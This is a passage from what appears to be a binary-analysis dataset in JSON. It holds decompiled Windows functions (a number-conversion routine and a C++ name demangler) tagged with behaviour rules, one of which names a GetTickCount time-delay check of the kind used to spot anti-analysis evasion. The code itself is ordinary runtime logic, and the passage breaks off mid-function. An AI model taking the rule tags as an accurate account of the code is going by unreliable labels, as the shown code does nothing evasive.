        "decompiled_code": "\nuint64_t fcn.14001d7b0(int64_t arg1, int32_t *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    \n    uVar1 = arg1 + 0x18;\n    iVar2 = uVar1 + *(arg1 + 0x14) * 4;\n    uVar3 = *(iVar2 + -4);\n    uVar7 = 0x1f;\n    if (uVar3 != 0) {\n        for (; uVar3 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n        }\n    }\n    uVar7 = uVar7 ^ 0x1f;\n    *arg2 = 0x20 - uVar7;\n    if (10 < uVar7) {\n        uVar4 = uVar7 - 0xb;\n        if (uVar1 < iVar2 - 4U) {\n            uVar5 = *(iVar2 + -8);\n            uVar6 = uVar5;\n            if (uVar7 - 0xb != 0) {\n                uVar3 = uVar3 << (uVar4 & 0x1f) | uVar5 >> (0x20 - uVar4 & 0x1f);\n                uVar5 = uVar5 << (uVar4 & 0x1f);\n                uVar6 = uVar5;\n                if (uVar1 < iVar2 - 8U) {\n                    return CONCAT44(uVar3, uVar5 | *(iVar2 + -0xc) >> (0x20 - uVar4 & 0x1f)) | 0x3ff0000000000000;\n                }\n            }\n        }\n        else {\n            uVar6 = 0;\n            if (uVar7 != 0xb) {\n                return (uVar3 << (uVar4 & 0x1f) | 0x3ff00000) << 0x20;\n            }\n        }\n        return (uVar3 | 0x3ff00000) << 0x20 | uVar6;\n    }\n    uVar5 = 0;\n    uVar4 = 0xb - uVar7;\n    if (uVar1 < iVar2 - 4U) {\n        uVar5 = *(iVar2 + -8) >> (uVar4 & 0x1f);\n    }\n    return CONCAT44(uVar3 >> (uVar4 & 0x1f), uVar3 << (uVar7 + 0x15U & 0x1f) | uVar5) | 0x3ff0000000000000;\n}\n",
        "token_count": 629
    },
    "14000e2e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x000140010c29: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140010cd3: Changing call to branch\n// WARNING: Possible PIC construction at 0x0001400113d1: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000f935: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014001131a: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014001133e: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014001123e: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140011260: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014001121f: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140010e8b: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140010eaf: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140010a45: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140010997: Changing call to branch\n// WARNING: Possible PIC construction at 0x0001400110f7: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140011133: Changing call to branch\n// WARNING: Possible PIC construction at 0x0001400109e4: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000fd7c: Changing call to branch\n// WARNING: Possible PIC construction at 0x0001400105ff: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140010c80: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140010cc1: Changing call to branch\n// WARNING: Possible PIC construction at 0x00014000e688: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140010c13: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00014000e68d)\n// WARNING: Removing unreachable block (ram,0x000140010b64)\n// WARNING: Removing unreachable block (ram,0x000140010b9e)\n// WARNING: Removing unreachable block (ram,0x000140010bd2)\n// WARNING: Removing unreachable block (ram,0x000140010bb0)\n// WARNING: Removing unreachable block (ram,0x000140010bdd)\n// WARNING: Removing unreachable block (ram,0x000140010bb7)\n// WARNING: Removing unreachable block (ram,0x000140010c09)\n// WARNING: Removing unreachable block (ram,0x000140010cc6)\n// WARNING: Removing unreachable block (ram,0x000140010c85)\n// WARNING: Removing unreachable block (ram,0x000140010604)\n// WARNING: Removing unreachable block (ram,0x00014001062a)\n// WARNING: Removing unreachable block (ram,0x000140010652)\n// WARNING: Removing unreachable block (ram,0x000140010630)\n// WARNING: Removing unreachable block (ram,0x00014001065e)\n// WARNING: Removing unreachable block (ram,0x000140010637)\n// WARNING: Removing unreachable block (ram,0x00014001068a)\n// WARNING: Removing unreachable block (ram,0x000140010fe9)\n// WARNING: Removing unreachable block (ram,0x000140010697)\n// WARNING: Removing unreachable block (ram,0x00014000fd81)\n// WARNING: Removing unreachable block (ram,0x0001400109e9)\n// WARNING: Removing unreachable block (ram,0x000140011138)\n// WARNING: Removing unreachable block (ram,0x0001400110fc)\n// WARNING: Removing unreachable block (ram,0x00014001099c)\n// WARNING: Removing unreachable block (ram,0x000140010a4a)\n// WARNING: Removing unreachable block (ram,0x000140010eb4)\n// WARNING: Removing unreachable block (ram,0x000140010e90)\n// WARNING: Removing unreachable block (ram,0x000140011224)\n// WARNING: Removing unreachable block (ram,0x000140011265)\n// WARNING: Removing unreachable block (ram,0x000140011243)\n// WARNING: Removing unreachable block (ram,0x00014001131f)\n// WARNING: Removing unreachable block (ram,0x000140011343)\n// WARNING: Removing unreachable block (ram,0x00014001135c)\n// WARNING: Removing unreachable block (ram,0x000140011326)\n// WARNING: Removing unreachable block (ram,0x00014000f93a)\n// WARNING: Removing unreachable block (ram,0x0001400113d6)\n// WARNING: Removing unreachable block (ram,0x000140010cd8)\n// WARNING: Removing unreachable block (ram,0x000140010c2e)\n// WARNING: Removing unreachable block (ram,0x000140010c18)\n// WARNING: Removing unreachable block (ram,0x00014000e69b)\n\nvoid fcn.14000e2e0(uchar *arg1, ulong noname_1, uint32_t *arg3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    ulong uVar4;\n    int32_t *piVar5;\n    ulong *puVar6;\n    uint8_t *puVar7;\n    uint32_t *puVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    bool bVar13;\n    int32_t iVar14;\n    int64_t iVar15;\n    uint64_t uVar16;\n    int64_t *piVar17;\n    int64_t iVar18;\n    int32_t *piVar19;\n    int64_t iVar20;\n    int64_t *piVar21;\n    ulong uVar22;\n    int64_t *piVar23;\n    uint32_t *puVar24;\n    uint32_t **ppuVar25;\n    int64_t **ppiVar26;\n    uchar uVar27;\n    uint8_t uVar28;\n    uint32_t uVar29;\n    uchar *unaff_RBX;\n    uint64_t unaff_RBP;\n    int64_t iVar30;\n    char *pcVar31;\n    uint32_t **ppuVar32;\n    uchar *puVar33;\n    uint32_t *unaff_RSI;\n    uchar *puVar34;\n    uint64_t unaff_RDI;\n    uint64_t uVar35;\n    char *pcVar36;\n    uint32_t *puVar37;\n    ulong in_R9;\n    uint32_t uVar38;\n    uint32_t uVar39;\n    ulong uStack256;\n    int64_t iStack216;\n    int32_t *piStack208;\n    ulong uStack200;\n    ulong uStack192;\n    int32_t aiStack184 [2];\n    ulong uStack176;\n    ulong uStack168;\n    uint auStack160 [12];\n    ulong uStack112;\n    ulong uStack80;\n    uchar auStack72 [8];\n    \n    if (arg3 == NULL) goto code_r0x00014000e330;\n    uVar38 = *(arg1 + 0x130);\n    uVar35 = uVar38;\n    if (uVar38 != 0) {\n        return;\n    }\n    uVar39 = *arg3;\n    if (0x51 < uVar39) goto code_r0x00014000e330;\n    // switch table (82 cases) at 0x14010c91c\n    switch(*(uVar39 * 4 + 0x14010c91c) + 0x14010c91c) {\n    case 0x14000e330:\n        goto code_r0x00014000e330;\n    case 0x14000e350:\n        uStack200 = *(arg1 + 0x128);\n        piVar23 = uStack200;\n        if (uStack200 != NULL) {\n            do {\n                if (*(piVar23 + 2) == 0) {\n                    if (2 < *piVar23[1] - 0x19) break;\n                    if (uVar39 == *piVar23[1]) goto code_r0x00014000e398;\n                }\n                piVar23 = *piVar23;\n            } while (piVar23 != NULL);\n            goto code_r0x00014000e3c7;\n        }\n        puVar37 = *(arg3 + 4);\n        goto code_r0x00014000e4e3;\n    case 0x14000e3c0:\n        uStack200 = *(arg1 + 0x128);\ncode_r0x00014000e3c7:\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        uStack176 = *(arg1 + 0x120);\n        goto code_r0x00014000e3ef;\n    case 0x14000e438:\n        uStack200 = *(arg1 + 0x128);\n        uVar22 = *(arg3 + 6);\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        uStack176 = *(arg1 + 0x120);\n        aiStack184[0] = 0;\n        uStack256 = 0x14000e47c;\n        uStack192 = arg3;\n        fcn.1400113f0(arg1, 0x11, uVar22);\n        if (aiStack184[0] == 0) {\n            uStack256 = 0x1400109fe;\n            fcn.140011490(arg1, 0x11, arg3);\n        }\n        *(arg1 + 0x128) = uStack200;\n        return;\n    case 0x14000e4a0:\n        puVar24 = *(arg3 + 4);\n        uVar2 = *(arg1 + 0x138);\n        uVar29 = *puVar24;\n        puVar37 = puVar24;\n        if ((uVar2 == 0) && (uVar38 = 0,  uVar29 == 5)) {\n            iVar14 = *(arg1 + 0x158);\n            if (0 < iVar14) {\n                ppuVar25 = *(arg1 + 0x150);\n                ppuVar32 = ppuVar25 + iVar14 * 2;\n                do {\n                    if (puVar24 == *ppuVar25) {\n                        ppuVar32 = *(arg1 + 0x148);\n                        goto joined_r0x000140010f17;\n                    }\n                    ppuVar25 = ppuVar25 + 2;\n                } while (ppuVar32 != ppuVar25);\n            }\n            if (*(arg1 + 0x15c) <= iVar14) goto code_r0x00014000e330;\n            piVar23 = *(arg1 + 0x120);\n            ppuVar25 = iVar14 * 0x10 + *(arg1 + 0x150);\n            *(arg1 + 0x158) = iVar14 + 1;\n            ppuVar32 = ppuVar25 + 1;\n            *ppuVar25 = puVar24;\n            if (piVar23 != NULL) {\n                uVar35 = *(arg1 + 0x168);\n                iVar14 = *(arg1 + 0x16c);\n                iVar15 = uVar35 << 4;\n                ppuVar25 = ppuVar32;\n                do {\n                    if (iVar14 <= uVar35) goto code_r0x00014000e330;\n                    puVar8 = piVar23[1];\n                    uVar38 = uVar35 + 1;\n                    uVar35 = uVar38;\n                    *(arg1 + 0x168) = uVar38;\n                    ppuVar32 = *(arg1 + 0x160) + iVar15;\n                    iVar15 = iVar15 + 0x10;\n                    ppuVar32[1] = puVar8;\n                    *ppuVar25 = ppuVar32;\n                    piVar23 = *piVar23;\n                    ppuVar25 = ppuVar32;\n                } while (piVar23 != NULL);\n            }\n            *ppuVar32 = NULL;\ncode_r0x000140010f3f:\n            uStack256 = 0x140010f4a;\n            uVar38 = uVar2;\n            puVar24 = fcn.14000acb0(arg1, puVar24);\n            if (puVar24 == NULL) goto code_r0x00014000e330;\n            goto code_r0x000140010f53;\n        }\n        goto code_r0x00014000e4c1;\n    case 0x14000e520:\n        piVar19 = *(arg3 + 4);\n        if (*piVar19 != 0x27) {\n            uVar38 = 0;\ncode_r0x00014000e546:\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140010d28;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                piVar19 = *(arg3 + 4);\n                iVar15 = 0;\n                iVar18 = 1;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = 0x28;\n            arg1[0x108] = 0x28;\n            uStack256 = 0x14000e57c;\n            fcn.1400113f0(arg1, 0x11, piVar19);\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140010cf9;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = 0x29;\n            arg1[0x108] = 0x29;\n            if (*arg3 == 0x3e) {\n                uVar27 = 0x2d;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x140010cd8;\n                unaff_RBX = arg1;\n                unaff_RSI = arg3;\n                goto code_r0x00014000ac40;\n            }\n            if (uVar38 == 8) {\n                uVar27 = 0x5b;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x140010c2e;\n                unaff_RBX = arg1;\n                unaff_RSI = arg3;\n                goto code_r0x00014000ac40;\n            }\n            goto code_r0x00014000e5c0;\n        }\n        uVar38 = *(*(piVar19 + 4) + 0x1c);\n        if (6 < uVar38) {\n            if ((((uVar38 == 7) && (piVar5 = *(arg3 + 6),  *piVar5 == 0)) && (piVar5[6] == 1)) && (uVar39 == 0x3d)) {\n                if (**(piVar5 + 4) == '0') {\n                    pcVar36 = \"false\";\n                    goto code_r0x00014000ad10;\n                }\n                if (**(piVar5 + 4) == '1') {\n                    pcVar36 = \"true\";\n                    goto code_r0x00014000ad10;\n                }\n            }\n            goto code_r0x00014000e546;\n        }\n        if ((uVar38 == 0) || (**(arg3 + 6) != 0)) goto code_r0x00014000e546;\n        if (uVar39 == 0x3e) {\n            uVar27 = 0x2d;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x1400113d6;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n            goto code_r0x00014000ac40;\n        }\n        uStack256 = 0x140010e0d;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 6));\n        if (4 < uVar38 - 2) {\n            return;\n        }\n    // switch table (5 cases) at 0x14010ca64\n        switch(*((uVar38 - 2) * 4 + 0x14010ca64) + 0x14010ca64) {\n        case 0x140010e26:\n            pcVar36 = 0x14010c87e;\n            break;\n        case 0x140010e32:\n            pcVar36 = 0x14010c87b;\n            break;\n        case 0x140010e3e:\n            uVar27 = 0x6c;\n            goto code_r0x00014000ac40;\n        case 0x140010e48:\n            uVar27 = 0x75;\n            goto code_r0x00014000ac40;\n        case 0x140010e52:\n            pcVar36 = 0x14010c881;\n        }\n        goto code_r0x00014000ad10;\n    case 0x14000e5c0:\n        goto code_r0x00014000e5c0;\n    case 0x14000e5d0:\n        if (*(arg3 + 4) != 0) {\n            uStack256 = 0x14000e5e3;\n            fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        }\n        if (*(arg3 + 6) == 0) {\n            return;\n        }\n        uVar35 = *(arg1 + 0x100);\n        uVar16 = uVar35;\n        if (0xfd < uVar35) {\n            arg1[uVar35] = 0;\n            uVar16 = 0;\n            uStack256 = 0x140010a68;\n            (**(arg1 + 0x110))(arg1, uVar35, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            *(arg1 + 0x100) = 0;\n        }\n        puVar34 = 0x14010c850;\n        do {\n            uVar27 = *puVar34;\n            if (uVar16 == 0xff) {\n                arg1[0xff] = 0;\n                uVar35 = 1;\n                uStack256 = 0x14000e665;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                uVar16 = 0;\n            }\n            else {\n                uVar35 = uVar16 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = uVar35;\n            arg1[uVar16] = uVar27;\n            arg1[0x108] = uVar27;\n            uVar16 = uVar35;\n        } while (puVar34 != 0x14010c852);\n        iVar14 = *(arg1 + 0x140);\n        uStack256 = 0x14001049a;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 6));\n        if (*(arg1 + 0x140) != iVar14) {\n            return;\n        }\n        if (*(arg1 + 0x100) != uVar35) {\n            return;\n        }\n        *(arg1 + 0x100) = uVar35 - 2;\n        return;\n    case 0x14000e670:\n        uStack256 = 0x14000e67e;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        pcVar36 = 0x14010c6a5;\n        *0x20 = &stack0xffffffffffffff00;\n        uStack256 = 0x14000e68d;\n        unaff_RBX = arg1;\n        unaff_RBP = uVar35;\n        unaff_RSI = arg3;\n        goto code_r0x00014000ad10;\n    case 0x14000e6a3:\n        piVar19 = *(arg3 + 4);\n        uVar22 = *(arg1 + 0x128);\n        *(arg1 + 0x128) = 0;\n        if (piVar19 != NULL) {\n            iVar15 = *(arg1 + 0x120);\n            piVar23 = &stack0xffffffffffffff38;\n            piVar21 = 0;\n            uVar38 = 0;\n            do {\n                piVar17 = piVar23;\n                *piVar17 = piVar21;\n                uVar39 = uVar38 + 1;\n                *(piVar17 + 2) = 0;\n                iVar14 = *piVar19;\n                piVar17[1] = piVar19;\n                piVar17[3] = iVar15;\n                if ((0x35 < iVar14 - 0x1cU) || ((0x3400000000001fU >> (iVar14 - 0x1cU & 0x3f) & 1) == 0)) {\n                    *(arg1 + 0x128) = piVar17;\n                    if (iVar14 != 2) goto code_r0x00014000e720;\n                    piVar19 = *(piVar19 + 6);\n                    if ((*piVar19 == 0x48) && (piVar19 = *(piVar19 + 4),  piVar19 == NULL)) goto code_r0x00014000e330;\n                    piVar23 = &stack0xffffffffffffff38 + uVar38 * 4 * 8;\n                    ppiVar26 = &stack0xffffffffffffff38 + uVar39 * 4 * 8;\n                    goto code_r0x000140010d6c;\n                }\n                piVar19 = *(piVar19 + 4);\n                if (piVar19 == NULL) {\n                    *(arg1 + 0x128) = piVar17;\n                    goto code_r0x00014000e330;\n                }\n                piVar23 = piVar17 + 4;\n                piVar21 = piVar17;\n                uVar38 = uVar39;\n            } while (uVar39 != 4);\n            *(arg1 + 0x128) = piVar17;\n        }\n        goto code_r0x00014000e330;\n    case 0x14000e7d5:\n        pcVar36 = \"decltype (\";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000e83d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        uVar22 = *(arg3 + 4);\ncode_r0x00014000f848:\n        uStack256 = 0x14000f855;\n        fcn.1400113f0(arg1, 0x11, uVar22);\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x140010771;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x29;\n        arg1[0x108] = 0x29;\n        return;\n    case 0x14000e84d:\n        puVar34 = &stack0xffffffffffffff38;\n        uStack256 = 0x14000e865;\n        fcn.14000abc0(puVar34, 0x14010c2ac, arg3[4], in_R9);\n        uStack256 = 0x14000e86d;\n        iVar15 = sub.msvcrt.dll_strlen(puVar34);\n        if (iVar15 == 0) {\n            return;\n        }\n        puVar33 = puVar34 + iVar15;\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000e8de;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar34 != puVar33);\n        return;\n    case 0x14000e8ee:\n        iVar15 = *(arg1 + 0x100);\n        uVar38 = arg3[4];\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x140010ac7;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = uVar38;\n        arg1[0x108] = uVar38;\n        return;\n    case 0x14000e920:\n        uStack256 = 0x14000e92e;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\ncode_r0x00014000e5c0:\n        unaff_RSI = *(arg3 + 6);\n        goto code_r0x0001400113f0;\n    case 0x14000e933:\n        pcVar36 = \"non-virtual thunk to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000e99d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000e9ad:\n        pcVar36 = \"construction vtable for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000ea15;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        pcVar36 = \"-in-\";\n        uStack256 = 0x140010111;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14001016d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        goto code_r0x00014000e5c0;\n    case 0x14000ea25:\n        pcVar36 = \" [clone \";\n        uStack256 = 0x14000ea3e;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000ea9d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\ncode_r0x00014000fff0:\n        uStack256 = 0x140010001;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 6));\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x1400107cf;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x5d;\n        arg1[0x108] = 0x5d;\n        return;\n    case 0x14000eaad:\n        puVar34 = *(arg3 + 4);\n        if (arg3[6] == 0) {\n            return;\n        }\n        puVar33 = puVar34 + arg3[6];\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000eb1d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar34 != puVar33);\n        return;\n    case 0x14000eb2d:\n        pcVar36 = \"hidden alias for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000eb95;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000eba5:\n        if (arg3[4] == 0) {\n            pcVar36 = \"this\";\n        }\n        else {\n            pcVar36 = \"{parm#\";\n            unaff_RSI = &stack0xffffffffffffff38;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x140010604;\n            unaff_RBX = arg1;\n            unaff_RBP = uVar35;\n            unaff_RDI = arg3[4];\n        }\n        goto code_r0x00014000ad10;\n    case 0x14000ebd3:\n        if (*(arg1 + 0x138) != 0) {\n            pcVar36 = \"auto:\";\n            iVar15 = *(arg1 + 0x100);\n            do {\n                cVar1 = *pcVar36;\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14000ec4d;\n                    (**(arg1 + 0x110))(arg1);\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    iVar18 = iVar15 + 1;\n                }\n                pcVar36 = pcVar36 + 1;\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = cVar1;\n                arg1[0x108] = cVar1;\n                iVar15 = iVar18;\n            } while (pcVar36 != \"\");\n            puVar34 = &stack0xffffffffffffff38;\n            uStack256 = 0x1400106cd;\n            fcn.14000abc0(puVar34, 0x14010c2ac, arg3[4] + 1, in_R9);\n            uStack256 = 0x1400106d5;\n            iVar15 = sub.msvcrt.dll_strlen(puVar34);\n            if (iVar15 == 0) {\n                return;\n            }\n            puVar33 = puVar34 + iVar15;\n            iVar15 = *(arg1 + 0x100);\n            do {\n                uVar27 = *puVar34;\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14001073e;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    iVar18 = iVar15 + 1;\n                }\n                puVar34 = puVar34 + 1;\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = uVar27;\n                arg1[0x108] = uVar27;\n                iVar15 = iVar18;\n            } while (puVar33 != puVar34);\n            return;\n        }\n        uStack256 = 0x1400105a8;\n        puVar34 = arg1;\n        piVar19 = fcn.14000acb0(arg1, arg3);\n        if (piVar19 != NULL) {\n            if ((*piVar19 != 0x2f) || (iVar14 = *(puVar34 + 0x13c),  iVar14 < 0)) {\ncode_r0x0001400107ef:\n                puVar6 = *(arg1 + 0x120);\n                *(arg1 + 0x120) = *puVar6;\n                uStack256 = 0x14001080d;\n                fcn.1400113f0(arg1, 0x11, piVar19);\n                *(arg1 + 0x120) = puVar6;\n                return;\n            }\n            while (iVar14 != 0) {\n                piVar19 = *(piVar19 + 6);\n                iVar14 = iVar14 + -1;\n                if ((piVar19 == NULL) || (*piVar19 != 0x2f)) goto code_r0x00014000e330;\n            }\n            piVar19 = *(piVar19 + 4);\n            if (piVar19 != NULL) goto code_r0x0001400107ef;\n        }\n        goto code_r0x00014000e330;\n    case 0x14000ec5d:\n        pcVar36 = \"typeinfo for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000ecc5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = 